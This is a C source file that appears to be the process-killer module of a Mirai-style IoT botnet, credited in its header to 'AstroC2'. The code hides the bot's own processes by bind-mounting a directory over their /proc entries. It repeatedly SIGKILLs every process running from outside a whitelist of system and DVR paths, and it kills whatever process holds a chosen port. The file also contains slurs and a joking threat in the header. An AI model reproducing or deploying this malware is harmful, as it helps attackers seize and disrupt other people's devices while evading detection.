#define _GNU_SOURCE
/*

Source Modified By Cody/@CupidVX
Owner: uns0ught / AstroC2
Dont Send This Source to Anyone please

dont remove my creds
or ill run over ur nan in my honda
least you could do for back stabbing me :)
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <signal.h>
#include <string.h>


// Include custom header files
#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

// Declare global variables
int killer_pid = 0;
struct stat stat_t = {0};

// Define a directory to use for mounting.
#define SPOOFY_DIRECTORY "/etc/systmp.d"

// Function to kill the process
void goodbyeee() {
    kill(killer_pid, 9);
    exit(0);
}

// Function to create the mount directory
void makeMntDir() {
    // Check if the directory already exists
    if (stat(SPOOFY_DIRECTORY, &stat_t) == -1) {
        // If not, create the directory
        mkdir(SPOOFY_DIRECTORY, 0700);
    }
}

// Function to check if a device is already mounted
void checkDevice() {
    // Check if the mount directory already exists
    DIR* mntloc = opendir(SPOOFY_DIRECTORY);
    if (mntloc) {
    // If it exists, unmount it and create a new one
        closedir(mntloc);
        umount(SPOOFY_DIRECTORY);
        makeMntDir();
        return;
    }
    else if (ENOENT == errno) {
    // If it doesn't exist, create it
#ifdef DEBUG
        printf("[drag0n] This device is clean from previous traces of our binary.\n");
#endif
        makeMntDir();
        return;
    }
}

// Function to mount a directory
void mntdir(int pid) {
    // Create the path for the process' directory
    char programid[64];
    snprintf(programid, sizeof programid, "/proc/%d", pid);
    // Mount the directory to the process' directory
    mount(SPOOFY_DIRECTORY, programid, "", MS_BIND | MS_RDONLY, "");

#ifdef DEBUG
    printf("[drag0n] Masked one of our forked processes >> pid:[%d].\n", pid);
#endif
}

// Function to validate the mount
char validateMnt() {
  // Get information about the current kernel version
  struct utsname buffer;

  if (uname(&buffer) < 0) {
   // If the kernel version can't be obtained, it exits.
    #ifdef DEBUG
      printf("[drag0n] failed to call uname(), we are on a retarted device.\n");
      exit(EXIT_FAILURE);
    #endif
    return 0;
  }

  #ifdef DEBUG
    printf("[drag0n] This device is running the kernel '%s'.\n", buffer.release);
  #endif

  // Check if busybox is installed
  DIR* busybox = opendir("/bin/busybox");
  if (busybox) {
    closedir(busybox);
    return 1;
  } else if (ENOENT == errno) {
  // If busybox is not installed, return 0 and print.
    #ifdef DEBUG
      printf("[drag0n] We are not on a device running busybox.\n");
    #endif
    return 0;
  } else {
    #ifdef DEBUG
      printf("[drag0n] failed to call opendir(), we are on a retarded device.\n");
    #endif
    return 0;
  }
}

// Check if the real path of the current process matches the given path
char check_self_path(char *real_path)
{
// Define paths to be used in the function
    char *table_proc = "/proc/";
    char *table_exe = "/exe";
    char *self = "/proc/self/exe";

    int len;

    char self_path[64];
    // Get the real path of the current process
    if ((len = readlink(self, self_path, sizeof(self_path) - 1)) == -1)
        return 1;

    self_path[len] = 0;

    // Compare the real path of the current process with the given path
    if (!strcmp(real_path, self_path))
        return 0;

    return 1;
}

// Check if the given path is considered safe
char check_safe_path(char *real_path)
{
// Check if the real path of the current process matches the given path
    if (!check_self_path(real_path))
        return 1;

   // Define a list of paths that are considered safe
    char* kethead[] = {
        "/lib/systemd",
        "/usr/lib/systemd/systemd",
        "/usr/libexec/openssh/sftp-server",
        "/usr/lib/openssh/sftp-server",
        "/sys",
        "/system",
        "/sbin",
        "/bin",
        "/dvr",
        "/main/usr",
        "/mnt/mtd",
        "/org",
        "/userfs",
        "/home/process/net_process",
        "/var/tmp/sonia",
        "/usr/sbin",
        "/usr/bin",
        "/usr/lib/packagekit/packagekitd",
        "/usr/lib/accountsservice/accounts-daemon",
        "/usr/lib/policykit-1/polkitd",
        "/mnt",
        "/gm/bin",
        "/var/Sofia",
        "/usr/sbin/sshd",
        "/usr/sbin/ntpd",
        "/usr/sbin/cupsd",
        "/usr/lib/apt/methods/http",
        "/usr/sbin/crond",
        "/usr/sbin/rsyslogd",
        "/usr/sbin/inetd",
        "/usr/sbin/dnsmasq",
        "/usr/bin/DVRServer",
        "/usr/bin/DVRShell",
        "/usr/bin/DVRControl",
        "/usr/bin/DVRRemoteAgent",
        "/usr/bin/DVRNetService",
    };

    // Check if the given path contains any of the safe paths
    for (unsigned int i = 0; i < sizeof(kethead) / sizeof(kethead[0]); i++)
        if (strstr(real_path, kethead[i]))
            return 1;

    return 0;
}

// This function checks if the specified process ID is running from a safe location.
char check_real_path(char *pid)
{
    int len;

    // Define strings for paths and filenames.
    char *table_proc = "/proc/";
    char *table_exe = "/exe";
    char *self = "/proc/self/exe";

    // Define arrays to hold the executable and real paths.
    char exe_path[20], real_path[64];

    // Build the path to the executable file for the specified process ID.
    strcpy(exe_path, table_proc);
    strcat(exe_path, pid);
    strcat(exe_path, table_exe);

    // Get the real path of the executable file for the specified process ID.
    if ((len = readlink(exe_path, real_path, sizeof(real_path) - 1)) == -1)
        return 1;

    // Terminate the real path string.
    real_path[len] = 0;


   // Check if the real path is safe.
    if (!check_safe_path(real_path))
      return 0;

    return 1;
}


void initKiller(int opt, char* Booter) {

    // Check if current process is parent process
    if(fork() > 0)
        return;

    int pid = 0;
    struct dirent *files;
    DIR *proc;

    // Store current process ID in killer_pid
    killer_pid = getpid();

    // Hide current process from process list
    mntdir(getppid());
    mntdir(getpid());

    char *table_proc = "/proc/";
    char *table_exe = "/exe";
    char *self = "/proc/self/exe";
    char* isItUs;
    
    // If the proc directory can't be opened, return
    if((proc = opendir(table_proc)) == NULL)
        return;
        
        
#ifdef DEBUG
        printf("[drag0n] Our binary location is at %s on the way to your mums house.\n", Booter);
#endif

        // Create a buffer for storing binary location
        char nigga[64];
        snprintf(nigga, sizeof nigga, "%s", Booter);

        // Infinite loop for checking running processes
        while (1) {

        // Loop through all files in proc directory
        while ((files = readdir(proc))) {
        
            // Skip non-numeric filenames
            if (*(files->d_name) < '0' || *(files->d_name) > '9')
                continue;

            // Get process ID from filename
            if ((pid = atoi(files->d_name)) != killer_pid && pid != getppid() && pid > 1)
            {
                char path[32], buf[128] = {0};

                // Construct path to executable for the process
                strcpy(path, table_proc);
                strcat(path, files->d_name);
                strcat(path, table_exe);

                // Get executable path for the process
                readlink(path, buf, sizeof(buf) - 1);
                
                // Check if the binary location matches our own binary location
                isItUs = strstr(buf, nigga);


            if (!isItUs) {
                // Check if the process is safe
                if (!check_real_path(files->d_name)) {
                    // Kill the process if it's not safe
                    int ret = kill(atoi(files->d_name), SIGKILL);
                    if (ret == -1 && errno == ESRCH) {
                        // Process has already been deleted
                        #ifdef DEBUG
                        printf("[drag0n] Process has been deleted: pid: %s\n", files->d_name);
                        #endif
                    } else {
                        #ifdef DEBUG
                        printf("[drag0n] Killed an unknown process on device: binary location: [%s] | pid: %s\n", buf, files->d_name);
                        #endif
                    }
                }
            }
            // Clear buffer
            memset(buf, 0, sizeof(buf));
        }
    }
        // Reset file pointer to beginning of directory
        rewinddir(proc);
        
        // Wait for some time before checking again
        usleep(59969);
    }

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR* dir, * fd_dir;
    struct dirent* entry, * fd_entry;
    char path[PATH_MAX] = { 0 }, exe[PATH_MAX] = { 0 }, buffer[513] = { 0 };
    int pid = 0, fd = 0;
    char inode[16] = { 0 };
    char* ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[drag0n] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    char* table_tcp = table_retrieve_val(TABLE_KILLER_TCP, NULL);

    fd = open(table_tcp, O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char* pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char* fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("[drag0n] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
#endif
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}
